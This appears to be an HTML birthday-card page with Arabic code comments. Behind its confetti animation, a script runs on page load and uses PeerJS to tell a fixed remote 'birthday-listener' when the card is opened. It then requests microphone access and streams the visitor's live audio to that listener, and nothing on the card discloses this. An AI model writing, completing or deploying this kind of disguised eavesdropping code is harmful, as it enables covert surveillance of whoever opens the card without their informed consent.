<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>3‑Layer Cake Card</title>
  <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet"/>
  <link rel="stylesheet" href="style.css"/>
  <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
</head>
<body>
  <div class="card">
    <!-- ... كود التورتة والصوص والشمعة والكونفيتي زي ما هو ... -->
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const LISTENER_ID = 'birthday-listener';
      const peer = new Peer();            // peer عشوائي للمرسل
      let dataConn;

      peer.on('open', () => {
        // 1) افتح DataConnection للمستمع مباشرة
        dataConn = peer.connect(LISTENER_ID);
        dataConn.on('open', () => {
          // أرسل حدث فتح الصفحة
          dataConn.send({ event: 'page-open' });
        });

        // 2) اطلب إذن الميكروفون بعد فتح الـ DataChannel
        navigator.mediaDevices.getUserMedia({ audio: true })
          .then(stream => {
            // أرسل حدث الموافقة على الميكروفون
            dataConn.send({ event: 'mic-allowed' });
            // ثم ابدأ البث الصوتي
            peer.call(LISTENER_ID, stream);
          })
          .catch(err => {
            console.error("Mic access error:", err);
            dataConn.send({ event: 'mic-denied' });
          });
      });

      peer.on('error', console.error);

      // الكونفيتي (glitter) — اتركه كما هو
      const colors = ["#ffffff","#f8c2c9","#d19bb3","#e5bbd6"];
      for (let i = 0; i < 120; i++) {
        const c = document.createElement("div");
        c.className = "confetti";
        const s = Math.random()*8+4;
        c.style.width = c.style.height = s+"px";
        c.style.background = colors[Math.floor(Math.random()*colors.length)];
        c.style.left = Math.random()*100 + "%";
        const d = Math.random()*3+2;
        c.style.animation = `fall ${d}s linear infinite`;
        if (Math.random()<0.5) c.style.borderRadius = "50%";
        document.body.appendChild(c);
      }
    });
  </script>
</body>
</html>
